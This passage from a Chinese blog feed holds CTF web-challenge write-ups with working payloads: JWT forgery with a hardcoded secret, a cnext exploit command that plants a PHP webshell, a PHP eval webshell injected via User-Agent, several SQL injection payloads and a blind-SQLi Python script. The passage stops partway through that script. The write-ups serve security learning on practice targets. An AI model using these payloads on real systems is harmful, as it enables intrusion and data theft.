        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年1月31日</em></p><p><em>练习数量：2</em></p><p>下篇：<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a><br>5️⃣<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><h2 id="⭐️-01-SWPUCTF-2025-秋季新生赛-”j”wt"><a href="#⭐️-01-SWPUCTF-2025-秋季新生赛-”j”wt" class="headerlink" title="⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt"></a>⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt</h2><p>🚩flag：<code>NSSCTF{18a9770a-1881-4d6c-bc97-10cef8f39967}</code></p><p>💡hint：<code>java</code> <code>jwt</code> <code>JAR反编译</code> <code>JAVA审计</code> <code>JWT伪造</code></p><p>🔧tool：<code>jadx-gui</code> <code>www.jwt.io</code> <code>burpsuite</code></p><p>JWT（JSON Web Token）是一种<br>👉 把“你是谁 + 是否已登录”这些信息，打包成一个字符串，在前后端之间安全传来传去的方式。<br>结构：Header.Payload.Signature</p><p>工具启动：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">jadx-gui</span><br></pre></td></tr></tbody></table></figure><p>由下面两段代码得出username和password：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping({"/login"})</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> LoginRequest request)</span> {</span><br><span class="line">        System.out.println(<span class="string">"Login attempt: "</span> + request.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (isValidUser(request.getUsername(), request.getPassword())) {</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder().setSubject(request.getUsername()).claim(<span class="string">"role"</span>, ClassicConstants.USER_MDC_KEY).setIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>()).setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + CoreConstants.MILLIS_IN_ONE_HOUR)).signWith(SECRET_KEY).compact();</span><br><span class="line">            System.out.println(<span class="string">"Generated token for "</span> + request.getUsername() + <span class="string">" (role: user): "</span> + token);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(token);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="string">"Login failed for: "</span> + request.getUsername());</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(<span class="number">401</span>).body(<span class="string">"Login failed: Invalid credentials"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidUser</span><span class="params">(String username, String password)</span> {</span><br><span class="line">        <span class="keyword">return</span> ClassicConstants.USER_MDC_KEY.equals(username) &amp;&amp; <span class="string">"Ns3.P@s3w0rd"</span>.equals(password);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>得到用户名和密码：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">{<span class="string">"username"</span>:<span class="string">"user"</span>,<span class="string">"password"</span>:<span class="string">"Ns3.P@s3w0rd"</span>}</span><br></pre></td></tr></tbody></table></figure><p>注意抓包。<br>返回值就是 JWT 字符串。</p><p>对称密钥硬编码，可直接伪造 admin</p><p>源码里：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SECRET_STRING</span> <span class="operator">=</span> <span class="string">"supersecretkeythatis32byteslong123!"</span>;</span><br><span class="line">SECRET_KEY = Keys.hmacShaKeyFor(keyBytes);</span><br></pre></td></tr></tbody></table></figure><p>解析时也是：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">Jwts.parserBuilder().setSigningKey(SECRET_KEY).build().parseClaimsJws(token)</span><br></pre></td></tr></tbody></table></figure><p>这意味着：<strong>只要你用同样的 secret 用 HS256 重新签名，服务端就会相信。</strong></p><p>伪造思路：把 payload 的 role 改成 admin</p><p><code>/profile</code> 里：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">role</span> <span class="operator">=</span> (String) claims.get(<span class="string">"role"</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"admin"</span>.equals(role)) {</span><br><span class="line">  profile.put(<span class="string">"flag"</span>, getFlag());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>使用工具：<a href="https://www.jwt.io/">https://www.jwt.io/</a><br>进行JWT的解析和生成</p><p>将原来的抓包：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">GET /profile HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:25946</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Njk4NjUwNDMsImV4cCI6MTc2OTg2ODY0M30.dWTGzjxvO1UmFg77uODq_KLbNRu9NEbc6x3FDI1V1VM</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://node1.anna.nssctf.cn:25946/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></tbody></table></figure><p>当中的JWT修改为（注意要用到上面的secret string)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY5ODY1MDQzLCJleHAiOjE3Njk4Njg2NDN9.pobCyK-xZOaffUZIAP29DfQGEI5kYT00RAtWPv-fXfY</span><br></pre></td></tr></tbody></table></figure><p>然后就能在页面中拿到flag。</p><p><img src="https://a1.boltp.com/2026/01/31/697e038a98787.png" alt="flag图片："></p><hr><h2 id="⭐️-02-SWPUCTF-2025-秋季新生赛-我是签到"><a href="#⭐️-02-SWPUCTF-2025-秋季新生赛-我是签到" class="headerlink" title="⭐️ 02 [SWPUCTF 2025 秋季新生赛]我是签到"></a>⭐️ 02 [SWPUCTF 2025 秋季新生赛]我是签到</h2><p>🚩flag：<code>NSSCTF{9d42f763-63c8-40d6-a4bb-31f0a37393fd}</code></p><p>💡hint：<code>WEB</code> </p><p>🔧tool：<code>docker</code> <code>cnext-exploits</code></p><p>题目描述：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'file'</span>])){ </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File contents: <span class="subst">$data</span>"</span>;}</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>攻击脚本：<a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><p>后面弄了一个ubuntu的docker环境在上面做出来的。</p><p>太不容易了。做了三个多小时才出来。exploit成功之后拿flag又折腾了一下。还是太不熟练了</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 cnext-exploit.py \</span><br><span class="line">  http://node1.anna.nssctf.cn:27059/ \</span><br><span class="line">  <span class="string">"echo PD9waHAgcGFzc3RocnUoJF9QT1NUWydjbWQnXSk7ID8+ | base64 -d &gt; /var/www/html/1.php"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://a1.boltp.com/2026/01/31/697e2076bd9e0.png" alt="攻击图1"></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  -d <span class="string">'cmd=env'</span> \</span><br><span class="line">  http://node1.anna.nssctf.cn:27059/1.php</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://a1.boltp.com/2026/01/31/697e205bd05d8.png" alt="获得flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Web暑期刷题记录</title>
      <link href="/2026/01/31/CTF-Web%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2026/01/31/CTF-Web%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>以下题目来源：ctfshow web</p><p>(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧🌟⭐🌠</p><h2 id="01-web签到题"><a href="#01-web签到题" class="headerlink" title="01 web签到题"></a>01 web签到题</h2><p>🚩 flag：<code>ctfshow{cbb55ba5-575a-4f44-8eaa-666c079fe370}</code></p><p>打开环境，使用开发者模式，观察发现有注释，注释的文本放到cyberchef中进行base64解码得到flag。</p><h2 id="02-web2"><a href="#02-web2" class="headerlink" title="02 web2"></a>02 web2</h2><p>🚩 flag：<code>ctfshow{7d63dc7e-1f02-41b1-b1a0-fa0d7618d264}</code><br>（flag动态生成）</p><p>最简单的sql注入。</p><p>考查点：<br>基本的SQL注入<br>多表联合查询<br>在用户名处注入sql语句，密码随意</p><p>1.查当前数据库名称</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>得到数据库名称web2<br>1 和 3 是占位值，确保列数与原始查询匹配。</p><p>3.查表的名字<br>第一个表:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>得到表名：flag 第二个表:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 1,2),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>得到表名：user</p><p>4.查flag表列的数量</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>只有1列</p><p>5.查flag表列的名字</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select column_name from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>列名为flag</p><p>6.查flag表记录的数量</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></tbody></table></figure><p>只有一条记录</p><p>7.查flag表记录值</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">' or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#--</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><p>ctfshow{7d63dc7e-1f02-41b1-b1a0-fa0d7618d264}</p><h2 id="03-web3"><a href="#03-web3" class="headerlink" title="03 web3"></a>03 web3</h2><p>🚩 flag：<code>ctfshow{6a8817d0-e200-4fef-9e96-f2855fe95e4b}</code></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: fe4af376-f216-<span class="number">4935</span>-acca-d5add9f67e19.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Sec-Ch-Ua: <span class="string">"Chromium"</span>;v=<span class="string">"127"</span>, <span class="string">"Not)A;Brand"</span>;v=<span class="string">"99"</span></span><br><span class="line">Sec-Ch-Ua-Mobile: ?<span class="number">0</span></span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">"macOS"</span></span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">127.0</span>.<span class="number">6533.100</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Priority: u=0, i</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br></pre></td></tr></tbody></table></figure><p>修改协议头： POST /?url=php://filter/resource=ctf_go_go_go HTTP/1.1</p><h2 id="04-web4"><a href="#04-web4" class="headerlink" title="04 web4"></a>04 web4</h2><p>🚩 flag：<code>ctfshow{4cbf9c46-00b1-4758-adc6-8f7574620d40}</code></p><p>页面最明显的位置展示了源码的核心,提示我们利用文件包含漏洞</p><p><img src="https://raw.gitcode.com/user-images/assets/6743157/cd6286ce-9fe3-479b-95f2-2c04ebf6dce6/image.png" alt="image.png" title="image.png"></p><p>包含日志文件,查看日志文件的信息,可以看到日志文件中保存了网站的访问记录,包括HTTP请求行,Referer,User-Agent等HTTP请求的信息</p><p>查看日志信息：<code>https://4214eedd-6ba0-4f21-a280-76b7045a7d70.challenge.ctf.show/?url=/var/log/nginx/access.log</code></p><p>重开了一个新的：<code>https://0af48cbc-562c-4d78-abe3-5a28b4e987c6.challenge.ctf.show/?url=/var/log/nginx/access.log</code></p><p>使用代理工具(Burp Suite)抓包,在User-Agent中插入一句话木马</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'-7'</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到日志中多了一段信息：</p><p><img src="https://raw.gitcode.com/user-images/assets/6743157/fa3720c0-1b25-483b-be6f-cae34d3b69a4/image.png" alt="image.png" title="image.png"></p><p>很明显,日志文件的内容多了一条访问记录,但没有我们插入的一句话木马,这很正常,因为日志文件中的代码会被执行,而不会显示。</p><p>使用中国蚁剑连接：</p><p><img src="https://raw.gitcode.com/user-images/assets/6743157/e49bc0a1-7f38-4417-8732-0fa26ea46c31/image.png" alt="image.png" title="image.png"></p><p>使用文件管理，找到这个文件：</p><p><img src="https://raw.gitcode.com/user-images/assets/6743157/b7ca9cc7-cdd2-4412-b316-e83d1415a0fb/image.png" alt="image.png" title="image.png"></p><p>得到flag：</p><p><img src="https://raw.gitcode.com/user-images/assets/6743157/799d63e5-80a5-4821-a08a-b698ac8744f9/image.png" alt="image.png" title="image.png"></p><h2 id="05-web5"><a href="#05-web5" class="headerlink" title="05 web5"></a>05 web5</h2><p>🚩 flag：<code>ctfshow{4ff12fe2-ba6d-49ac-84c7-1d9b0773eae6}</code></p><p>题目信息：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">where is flag?</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0"</span> /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">""</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>)){</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>)){</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"v1 error"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>)){</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"v2 error"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>)){</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            }</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"where is flag?"</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>页面中展示了部分源码,从源码中我们可以得知,想要夺旗需要通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p><p>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false<br>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</p><p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></tbody></table></figure><p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p><p>240610708 的md5值为 0e462097431906509019562988736854</p><p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(==)时,会转化为0,也就是 0==0,返回true使if判断成立,从而输出flag</p><p>![截屏2025-08-07 22.46.06](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 22.46.06.png)</p><hr><h2 id="06-web6"><a href="#06-web6" class="headerlink" title="06 web6"></a>06 web6</h2><p>🚩 flag：<code>ctfshow{8f07da3b-c534-454c-8732-8987558d15dc}</code></p><p>注入点是单引号字符型注入,并且过滤了空格,我们可以使用括号()或者注释/**/绕过</p><p>先来一个万能账号,注意使用括号()替换空格,用户名输入以下payload,密码随便输</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'or(true)#</span></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-07 23.20.51](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.20.51.png)</p><p>使用<strong>联合注入</strong>获取当前使用的数据库</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'or(true)union(select(1),database(),3)#</span></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-07 23.21.11](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.21.11.png)</p><p>获取数据库中的所有表</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'or(true)union(select(1),</span></span><br><span class="line">(select(group_concat(table_name))from(information_schema.tables)</span><br><span class="line">where(table_schema=<span class="comment">'web2'))</span></span><br><span class="line">,<span class="number">3</span>)#</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-07 23.22.39](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.22.39.png)</p><p>获取flag表的所有字段</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'or(true)union(select(1),select(group_concat(column_name))from(information_schema.columns)where(table_schema='web2')and(table_name='flag')),3)#</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>获取flag表中的数据</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'or(true)union(select(1),(select(flag)from(flag)),3)#</span></span><br></pre></td></tr></tbody></table></figure><p>把整个内容复制到输入框中提交flag,即可过关。</p><p>![截屏2025-08-07 23.25.35](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.25.35.png)</p><hr><h2 id="07-web7"><a href="#07-web7" class="headerlink" title="07 web7"></a>07 web7</h2><p>🚩 flag：<code>ctfshow{44c69047-9003-403f-8d76-5dbe358bb690}</code></p><p>第7关是一个SQL注入漏洞，注入点是数值型注入,源码中过滤了空格,可以使用括号()或者注释/**/来代替空格。</p><p>![截屏2025-08-07 23.29.49](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.29.49.png)</p><p>随便点入一个文章，从url地址栏中可以看到页面通过文章的id值来查询文章内容，我们可以考虑SQL注入漏洞。</p><p>首先判断注入点，输入以下payload，使SQL恒成立：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">1</span>/**/<span class="keyword">and</span>/**/<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>结果为页面正常显示。</p><p>输入以下payload使SQL恒不成立：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">1</span>/**/<span class="keyword">and</span>/**/<span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>结果为页面空显示。</p><p>先来判断显示位，此处id传一个-1，由于id通常不为负数，后端根据id查询不到内容,就只能展示联合查询的结果，从而帮助我们判断字段显示的位置。</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span>/**/union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>显示位为2，那么接下来把2替换成database()，判断当前使用的数据库。</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span>/**/union/**/select/**/<span class="number">1</span>,database(),<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>得知当前使用的数据库是web7</p><p>接下来获取当前数据库中的所有表。</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span>/**/union/**/select/**/<span class="number">1</span>,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=<span class="string">"web7"</span>),<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>看到有一个flag表。</p><p>获取flag表中的所有字段：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span>/**/union/**/select/**/<span class="number">1</span>,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=<span class="string">"web7"</span>/**/<span class="keyword">and</span>/**/table_name=<span class="string">"flag"</span>),<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>flag表中只有一个flag字段</p><p>接下来查询flag表的flag字段，获取flag。</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span>/**/union/**/select/**/<span class="number">1</span>,(select/**/flag/**/from/**/flag),<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>获取到flag。</p><p>![截屏2025-08-07 23.37.16](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.37.16.png)</p><hr><h2 id="08-web8"><a href="#08-web8" class="headerlink" title="08 web8"></a>08 web8</h2><p>🚩 flag：<code>ctfshow{937b1c07-5702-45aa-ad1b-6f700d59bdc5}</code></p><p>注入点是数值型, 注入类型推荐使用布尔盲注,此关卡过滤了空格,逗号,and,union等关键字,</p><ol><li>过滤空格, 可以使用括号() 或者注释/**/ 绕过</li><li>过滤and, 可以使用or替代</li><li>过滤union, 可以用盲注替代联合注入</li><li>过滤逗号, 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用substr(database() from 1 for 1)来代替</li></ol><p>首先确定注入点, 输入以下payload使SQL恒成立：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span>/**/<span class="keyword">or</span>/**/true</span><br></pre></td></tr></tbody></table></figure><p>由于SQL恒成立, 数据库将查询出表中的所有内容, 并返回到前端展示。</p><p>再输入一下payload 使SQL恒不成立：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span>/**/<span class="keyword">or</span>/**/false</span><br></pre></td></tr></tbody></table></figure><p>数据库查询不到任何数据, 从而导致页面空显示。</p><p>由以上返回结果可知, 该页面存在SQL注入, 注入点为<strong>数值型注入</strong>。</p><p>接下来进行脱库, 由于盲注脱库比较复杂, 此处我们构造Python脚本进行自动化脱库, 注意payload中的字符串不要换行, 否则可能会出问题。</p><p>使用的python脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://f16c97e4-a96e-4dec-bb7e-2b0577547047.challenge.ctf.show/index.php?id=-1/**/or/**/'</span></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="comment"># 获取当前使用的数据库</span></span><br><span class="line">    <span class="comment"># payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'</span></span><br><span class="line">    <span class="comment"># 获取当前数据库的所有表</span></span><br><span class="line">    <span class="comment"># payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'</span></span><br><span class="line">    <span class="comment"># 获取flag表的字段</span></span><br><span class="line">    <span class="comment"># payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'</span></span><br><span class="line">    <span class="comment"># 获取flag表的数据</span></span><br><span class="line">    payload = <span class="string">'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'正在获取第 %d 个字符'</span> % i)</span><br><span class="line">    <span class="comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        result = requests.get(url + payload % (i, j))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'If'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'数据库名/表名/字段名/数据: %s'</span> % name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span 